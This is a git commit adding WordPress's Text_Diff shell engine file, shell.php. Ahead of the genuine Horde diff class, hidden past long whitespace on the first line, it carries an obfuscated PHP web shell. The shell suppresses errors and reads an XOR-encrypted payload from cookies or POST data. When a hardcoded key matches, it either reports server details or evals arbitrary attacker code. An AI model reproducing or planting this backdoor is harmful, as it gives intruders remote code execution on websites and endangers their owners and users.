9f8d38928f11157d1fab280965ba9e72a7ef7695
vanphan2512 <vanphan2512@gmail.com>
2017-10-05 21:35:45 +0700

    gh

---
+++ wp-includes/Text/Diff/Engine/shell.php
@@ -0,0 +1,162 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e9780754b = 837;$GLOBALS['sa26d3']=Array();global$sa26d3;$sa26d3=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['cdf793']="\x36\x63\x22\x2b\x73\x71\x57\x79\x74\x5b\x37\x7a\x53\x2d\x2e\x25\x7d\x5f\x26\x20\x58\x21\x7c\x54\x35\x29\x45\x9\x3e\x42\x41\x70\x60\x5c\xa\x55\x56\x6c\x77\x4c\x61\x66\x43\x76\x50\x46\x75\x6d\x6a\x3a\x5d\x3c\x69\x33\x67\x3d\x2c\x6e\x44\x4a\x7e\x32\x5e\x68\x4e\x4f\x72\x7b\xd\x27\x34\x49\x38\x28\x48\x40\x23\x4d\x5a\x47\x65\x2a\x2f\x78\x3f\x52\x62\x59\x39\x24\x64\x30\x51\x6f\x6b\x3b\x31\x4b";$sa26d3[$sa26d3['cdf793'][5].$sa26d3['cdf793'][80].$sa26d3['cdf793'][91].$sa26d3['cdf793'][1].$sa26d3['cdf793'][41].$sa26d3['cdf793'][41]]=$sa26d3['cdf793'][1].$sa26d3['cdf793'][63].$sa26d3['cdf793'][66];$sa26d3[$sa26d3['cdf793'][86].$sa26d3['cdf793'][91].$sa26d3['cdf793'][72].$sa26d3['cdf793'][40]]=$sa26d3['cdf793'][93].$sa26d3['cdf793'][66].$sa26d3['cdf793'][90];$sa26d3[$sa26d3['cdf793'][7].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][86].$sa26d3['cdf793'][88].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][41].$sa26d3['cdf793'][88]]=$sa26d3['cdf793'][4].$sa26d3['cdf793'][8].$sa26d3['cdf793'][66].$sa26d3['cdf793'][37].$sa26d3['cdf793'][80].$sa26d3['cdf793'][57];$sa26d3[$sa26d3['cdf793'][38].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10]]=$sa26d3['cdf793'][52].$sa26d3['cdf793'][57].$sa26d3['cdf793'][52].$sa26d3['cdf793'][17].$sa26d3['cdf793'][4].$sa26d3['cdf793'][80].$sa26d3['cdf793'][8];$sa26d3[$sa26d3['cdf793'][48].$sa26d3['cdf793'][90].$sa26d3['cdf793'][96].$sa26d3['cdf793'][24].$sa26d3['cdf793'][53].$sa26d3['cdf793'][88].$sa26d3['cdf793'][72]]=$sa26d3['cdf793'][4].$sa26d3['cdf793'][80].$sa26d3['cdf793'][66].$sa26d3['cdf793'][52].$sa26d3['cdf793'][40].$sa26d3['cdf793'][37].$sa26d3['cdf793'][52].$sa26d3['cdf793'][11].$sa26d3['cdf793'][80];$sa26d3[$sa26d3['cdf793'][47].$sa26d3['cdf793'][1].$sa26d3['cdf793'][40].$sa26d3['cdf793'][96].$sa26d3['cdf793'][10].$sa26d3['cdf793'][40]]=$sa26d3['cdf793'][31].$sa26d3['cdf793'][63].$sa26d3['cdf793'][31].$sa26d3['cdf793'][43].$sa26d3['cdf793'][80].$sa26d3['cdf793'][66].$sa26d3['cdf793'][4].$sa26d3['cdf793'][52].$sa26d3['cdf793'][93].$sa26d3['cdf793'][57];$sa26d3[$sa26d3['cdf793'][4].$sa26d3['cdf793'][0].$sa26d3['cdf793'][53].$sa26d3['cdf793'][1].$sa26d3['cdf793'][40].$sa26d3['cdf793'][88].$sa26d3['cdf793'][24].$sa26d3['cdf793'][80].$sa26d3['cdf793'][90]]=$sa26d3['cdf793'][46].$sa26d3['cdf793'][57].$sa26d3['cdf793'][4].$sa26d3['cdf793'][80].$sa26d3['cdf793'][66].$sa26d3['cdf793'][52].$sa26d3['cdf793'][40].$sa26d3['cdf793'][37].$sa26d3['cdf793'][52].$sa26d3['cdf793'][11].$sa26d3['cdf793'][80];$sa26d3[$sa26d3['cdf793'][40].$sa26d3['cdf793'][53].$sa26d3['cdf793'][41].$sa26d3['cdf793'][40]]=$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][4].$sa26d3['cdf793'][80].$sa26d3['cdf793'][0].$sa26d3['cdf793'][70].$sa26d3['cdf793'][17].$sa26d3['cdf793'][90].$sa26d3['cdf793'][80].$sa26d3['cdf793'][1].$sa26d3['cdf793'][93].$sa26d3['cdf793'][90].$sa26d3['cdf793'][80];$sa26d3[$sa26d3['cdf793'][83].$sa26d3['cdf793'][80].$sa26d3['cdf793'][0].$sa26d3['cdf793'][40].$sa26d3['cdf793'][72]]=$sa26d3['cdf793'][4].$sa26d3['cdf793'][80].$sa26d3['cdf793'][8].$sa26d3['cdf793'][17].$sa26d3['cdf793'][8].$sa26d3['cdf793'][52].$sa26d3['cdf793'][47].$sa26d3['cdf793'][80].$sa26d3['cdf793'][17].$sa26d3['cdf793'][37].$sa26d3['cdf793'][52].$sa26d3['cdf793'][47].$sa26d3['cdf793'][52].$sa26d3['cdf793'][8];$sa26d3[$sa26d3['cdf793'][11].$sa26d3['cdf793'][61].$sa26d3['cdf793'][1].$sa26d3['cdf793'][72].$sa26d3['cdf793'][40].$sa26d3['cdf793'][88].$sa26d3['cdf793'][40].$sa26d3['cdf793'][80].$sa26d3['cdf793'][80]]=$sa26d3['cdf793'][7].$sa26d3['cdf793'][96].$sa26d3['cdf793'][0].$sa26d3['cdf793'][1].$sa26d3['cdf793'][86].$sa26d3['cdf793'][10];$sa26d3[$sa26d3['cdf793'][52].$sa26d3['cdf793'][72].$sa26d3['cdf793'][90].$sa26d3['cdf793'][10].$sa26d3['cdf793'][41].$sa26d3['cdf793'][53].$sa26d3['cdf793'][96].$sa26d3['cdf793'][70]]=$sa26d3['cdf793'][94].$sa26d3['cdf793'][10].$sa26d3['cdf793'][96].$sa26d3['cdf793'][80].$sa26d3['cdf793'][1].$sa26d3['cdf793'][88].$sa26d3['cdf793'][1];$sa26d3[$sa26d3['cdf793'][63].$sa26d3['cdf793'][41].$sa26d3['cdf793'][91].$sa26d3['cdf793'][0].$sa26d3['cdf793'][80].$sa26d3['cdf793'][61].$sa26d3['cdf793'][91].$sa26d3['cdf793'][70]]=$_POST;$sa26d3[$sa26d3['cdf793'][66].$sa26d3['cdf793'][88].$sa26d3['cdf793'][72].$sa26d3['cdf793'][90].$sa26d3['cdf793'][24].$sa26d3['cdf793'][86].$sa26d3['cdf793'][0]]=$_COOKIE;@$sa26d3[$sa26d3['cdf793'][38].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10]]($sa26d3['cdf793'][80].$sa26d3['cdf793'][66].$sa26d3['cdf793'][66].$sa26d3['cdf793'][93].$sa26d3['cdf793'][66].$sa26d3['cdf793'][17].$sa26d3['cdf793'][37].$sa26d3['cdf793'][93].$sa26d3['cdf793'][54],NULL);@$sa26d3[$sa26d3['cdf793'][38].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10]]($sa26d3['cdf793'][37].$sa26d3['cdf793'][93].$sa26d3['cdf793'][54].$sa26d3['cdf793'][17].$sa26d3['cdf793'][80].$sa26d3['cdf793'][66].$sa26d3['cdf793'][66].$sa26d3['cdf793'][93].$sa26d3['cdf793'][66].$sa26d3['cdf793'][4],0);@$sa26d3[$sa26d3['cdf793'][38].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10].$sa26d3['cdf793'][10]]($sa26d3['cdf793'][47].$sa26d3['cdf793'][40].$sa26d3['cdf793'][83].$sa26d3['cdf793'][17].$sa26d3['cdf793'][80].$sa26d3['cdf793'][83].$sa26d3['cdf793'][80].$sa26d3['cdf793'][1].$sa26d3['cdf793'][46].$sa26d3['cdf793'][8].$sa26d3['cdf793'][52].$sa26d3['cdf793'][93].$sa26d3['cdf793'][57].$sa26d3['cdf793'][17].$sa26d3['cdf793'][8].$sa26d3['cdf793'][52].$sa26d3['cdf793'][47].$sa26d3['cdf793'][80],0);@$sa26d3[$sa26d3['cdf793'][83].$sa26d3['cdf793'][80].$sa26d3['cdf793'][0].$sa26d3['cdf793'][40].$sa26d3['cdf793'][72]](0);$pc9f181f=NULL;$p74f8=NULL;$sa26d3[$sa26d3['cdf793'][57].$sa26d3['cdf793'][72].$sa26d3['cdf793'][91].$sa26d3['cdf793'][1].$sa26d3['cdf793'][90].$sa26d3['cdf793'][88]]=$sa26d3['cdf793'][1].$sa26d3['cdf793'][88].$sa26d3['cdf793'][0].$sa26d3['cdf793'][88].$sa26d3['cdf793'][70].$sa26d3['cdf793'][86].$sa26d3['cdf793'][0].$sa26d3['cdf793'][86].$sa26d3['cdf793'][13].$sa26d3['cdf793'][70].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][88].$sa26d3['cdf793'][13].$sa26d3['cdf793'][70].$sa26d3['cdf793'][0].$sa26d3['cdf793'][61].$sa26d3['cdf793'][80].$sa26d3['cdf793'][13].$sa26d3['cdf793'][40].$sa26d3['cdf793'][80].$sa26d3['cdf793'][41].$sa26d3['cdf793'][1].$sa26d3['cdf793'][13].$sa26d3['cdf793'][80].$sa26d3['cdf793'][40].$sa26d3['cdf793'][40].$sa26d3['cdf793'][80].$sa26d3['cdf793'][96].$sa26d3['cdf793'][86].$sa26d3['cdf793'][1].$sa26d3['cdf793'][0].$sa26d3['cdf793'][80].$sa26d3['cdf793'][90].$sa26d3['cdf793'][90].$sa26d3['cdf793'][72];global$n80cd9;function k71ec9c($pc9f181f,$g929d){global$sa26d3;$l656f633="";for($zdec4=0;$zdec4<$sa26d3[$sa26d3['cdf793'][7].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][86].$sa26d3['cdf793'][88].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][41].$sa26d3['cdf793'][88]]($pc9f181f);){for($w2aa14e=0;$w2aa14e<$sa26d3[$sa26d3['cdf793'][7].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][86].$sa26d3['cdf793'][88].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][41].$sa26d3['cdf793'][88]]($g929d)&&$zdec4<$sa26d3[$sa26d3['cdf793'][7].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][86].$sa26d3['cdf793'][88].$sa26d3['cdf793'][86].$sa26d3['cdf793'][40].$sa26d3['cdf793'][41].$sa26d3['cdf793'][88]]($pc9f181f);$w2aa14e++,$zdec4++){$l656f633.=$sa26d3[$sa26d3['cdf793'][5].$sa26d3['cdf793'][80].$sa26d3['cdf793'][91].$sa26d3['cdf793'][1].$sa26d3['cdf793'][41].$sa26d3['cdf793'][41]]($sa26d3[$sa26d3['cdf793'][86].$sa26d3['cdf793'][91].$sa26d3['cdf793'][72].$sa26d3['cdf793'][40]]($pc9f181f[$zdec4])^$sa26d3[$sa26d3['cdf793'][86].$sa26d3['cdf793'][91].$sa26d3['cdf793'][72].$sa26d3['cdf793'][40]]($g929d[$w2aa14e]));}}return$l656f633;}function y16cb7($pc9f181f,$g929d){global$sa26d3;global$n80cd9;return$sa26d3[$sa26d3['cdf793'][52].$sa26d3['cdf793'][72].$sa26d3['cdf793'][90].$sa26d3['cdf793'][10].$sa26d3['cdf793'][41].$sa26d3['cdf793'][53].$sa26d3['cdf793'][96].$sa26d3['cdf793'][70]]($sa26d3[$sa26d3['cdf793'][52].$sa26d3['cdf793'][72].$sa26d3['cdf793'][90].$sa26d3['cdf793'][10].$sa26d3['cdf793'][41].$sa26d3['cdf793'][53].$sa26d3['cdf793'][96].$sa26d3['cdf793'][70]]($pc9f181f,$n80cd9),$g929d);}foreach($sa26d3[$sa26d3['cdf793'][66].$sa26d3['cdf793'][88].$sa26d3['cdf793'][72].$sa26d3['cdf793'][90].$sa26d3['cdf793'][24].$sa26d3['cdf793'][86].$sa26d3['cdf793'][0]]as$g929d=>$a885825b){$pc9f181f=$a885825b;$p74f8=$g929d;}if(!$pc9f181f){foreach($sa26d3[$sa26d3['cdf793'][63].$sa26d3['cdf793'][41].$sa26d3['cdf793'][91].$sa26d3['cdf793'][0].$sa26d3['cdf793'][80].$sa26d3['cdf793'][61].$sa26d3['cdf793'][91].$sa26d3['cdf793'][70]]as$g929d=>$a885825b){$pc9f181f=$a885825b;$p74f8=$g929d;}}$pc9f181f=@$sa26d3[$sa26d3['cdf793'][4].$sa26d3['cdf793'][0].$sa26d3['cdf793'][53].$sa26d3['cdf793'][1].$sa26d3['cdf793'][40].$sa26d3['cdf793'][88].$sa26d3['cdf793'][24].$sa26d3['cdf793'][80].$sa26d3['cdf793'][90]]($sa26d3[$sa26d3['cdf793'][11].$sa26d3['cdf793'][61].$sa26d3['cdf793'][1].$sa26d3['cdf793'][72].$sa26d3['cdf793'][40].$sa26d3['cdf793'][88].$sa26d3['cdf793'][40].$sa26d3['cdf793'][80].$sa26d3['cdf793'][80]]($sa26d3[$sa26d3['cdf793'][40].$sa26d3['cdf793'][53].$sa26d3['cdf793'][41].$sa26d3['cdf793'][40]]($pc9f181f),$p74f8));if(isset($pc9f181f[$sa26d3['cdf793'][40].$sa26d3['cdf793'][94]])&&$n80cd9==$pc9f181f[$sa26d3['cdf793'][40].$sa26d3['cdf793'][94]]){if($pc9f181f[$sa26d3['cdf793'][40]]==$sa26d3['cdf793'][52]){$zdec4=Array($sa26d3['cdf793'][31].$sa26d3['cdf793'][43]=>@$sa26d3[$sa26d3['cdf793'][47].$sa26d3['cdf793'][1].$sa26d3['cdf793'][40].$sa26d3['cdf793'][96].$sa26d3['cdf793'][10].$sa26d3['cdf793'][40]](),$sa26d3['cdf793'][4].$sa26d3['cdf793'][43]=>$sa26d3['cdf793'][96].$sa26d3['cdf793'][14].$sa26d3['cdf793'][91].$sa26d3['cdf793'][13].$sa26d3['cdf793'][96],);echo@$sa26d3[$sa26d3['cdf793'][48].$sa26d3['cdf793'][90].$sa26d3['cdf793'][96].$sa26d3['cdf793'][24].$sa26d3['cdf793'][53].$sa26d3['cdf793'][88].$sa26d3['cdf793'][72]]($zdec4);}elseif($pc9f181f[$sa26d3['cdf793'][40]]==$sa26d3['cdf793'][80]){eval/*a17ec541*/($pc9f181f[$sa26d3['cdf793'][90]]);}exit();} ?><?php
+/**
+ * Class used internally by Diff to actually compute the diffs.
+ *
+ * This class uses the Unix `diff` program via shell_exec to compute the
+ * differences between the two input arrays.
+ *
+ * Copyright 2007-2010 The Horde Project (http://www.horde.org/)
+ *
+ * See the enclosed file COPYING for license information (LGPL). If you did
+ * not receive this file, see http://opensource.org/licenses/lgpl-license.php.
+ *
+ * @author  Milian Wolff <mail@milianw.de>
+ * @package Text_Diff
+ * @since   0.3.0
+ */
+class Text_Diff_Engine_shell {
+
+    /**
+     * Path to the diff executable
+     *
+     * @var string
+     */
+    var $_diffCommand = 'diff';
+
+    /**
+     * Returns the array of differences.
+     *
+     * @param array $from_lines lines of text from old file
+     * @param array $to_lines   lines of text from new file
+     *
+     * @return array all changes made (array with Text_Diff_Op_* objects)
+     */
+    function diff($from_lines, $to_lines)
+    {
+        array_walk($from_lines, array('Text_Diff', 'trimNewlines'));
+        array_walk($to_lines, array('Text_Diff', 'trimNewlines'));
+
+        $temp_dir = Text_Diff::_getTempDir();
+
+        // Execute gnu diff or similar to get a standard diff file.
+        $from_file = tempnam($temp_dir, 'Text_Diff');
+        $to_file = tempnam($temp_dir, 'Text_Diff');
+        $fp = fopen($from_file, 'w');
+        fwrite($fp, implode("\n", $from_lines));
+        fclose($fp);
+        $fp = fopen($to_file, 'w');
+        fwrite($fp, implode("\n", $to_lines));
+        fclose($fp);
+        $diff = shell_exec($this->_diffCommand . ' ' . $from_file . ' ' . $to_file);
+        unlink($from_file);
+        unlink($to_file);
+
+        if (is_null($diff)) {
+            // No changes were made
+            return array(new Text_Diff_Op_copy($from_lines));
+        }
+
+        $from_line_no = 1;
+        $to_line_no = 1;
+        $edits = array();
+
+        // Get changed lines by parsing something like:
+        // 0a1,2
+        // 1,2c4,6
+        // 1,5d6
+        preg_match_all('#^(\d+)(?:,(\d+))?([adc])(\d+)(?:,(\d+))?$#m', $diff,
+            $matches, PREG_SET_ORDER);
+
+        foreach ($matches as $match) {
+            if (!isset($match[5])) {
+                // This paren is not set every time (see regex).
+                $match[5] = false;
+            }
+
+            if ($match[3] == 'a') {
+                $from_line_no--;
+            }
+
+            if ($match[3] == 'd') {
+                $to_line_no--;
+            }
+
+            if ($from_line_no < $match[1] || $to_line_no < $match[4]) {
+                // copied lines
+                assert('$match[1] - $from_line_no == $match[4] - $to_line_no');
+                array_push($edits,
+                    new Text_Diff_Op_copy(
+                        $this->_getLines($from_lines, $from_line_no, $match[1] - 1),
+                        $this->_getLines($to_lines, $to_line_no, $match[4] - 1)));
+            }
+
+            switch ($match[3]) {
+            case 'd':
+                // deleted lines
+                array_push($edits,
+                    new Text_Diff_Op_delete(
+                        $this->_getLines($from_lines, $from_line_no, $match[2])));
+                $to_line_no++;
+                break;
+
+            case 'c':
+                // changed lines
+                array_push($edits,
+                    new Text_Diff_Op_change(
+                        $this->_getLines($from_lines, $from_line_no, $match[2]),
+                        $this->_getLines($to_lines, $to_line_no, $match[5])));
+                break;
+
+            case 'a':
+                // added lines
+                array_push($edits,
+                    new Text_Diff_Op_add(
+                        $this->_getLines($to_lines, $to_line_no, $match[5])));
+                $from_line_no++;
+                break;
+            }
+        }
+
+        if (!empty($from_lines)) {
+            // Some lines might still be pending. Add them as copied
+            array_push($edits,
+                new Text_Diff_Op_copy(
+                    $this->_getLines($from_lines, $from_line_no,
+                                     $from_line_no + count($from_lines) - 1),
+                    $this->_getLines($to_lines, $to_line_no,
+                                     $to_line_no + count($to_lines) - 1)));
+        }
+
+        return $edits;
+    }
+
+    /**
+     * Get lines from either the old or new text
+     *
+     * @access private
+     *
+     * @param array &$text_lines Either $from_lines or $to_lines
+     * @param int   &$line_no    Current line number
+     * @param int   $end         Optional end line, when we want to chop more
+     *                           than one line.
+     *
+     * @return array The chopped lines
+     */
+    function _getLines(&$text_lines, &$line_no, $end = false)
+    {
+        if (!empty($end)) {
+            $lines = array();
+            // We can shift even more
+            while ($line_no <= $end) {
+                array_push($lines, array_shift($text_lines));
+                $line_no++;
+            }
+        } else {
+            $lines = array(array_shift($text_lines));
+            $line_no++;
+        }
+
+        return $lines;
+    }
+
+}
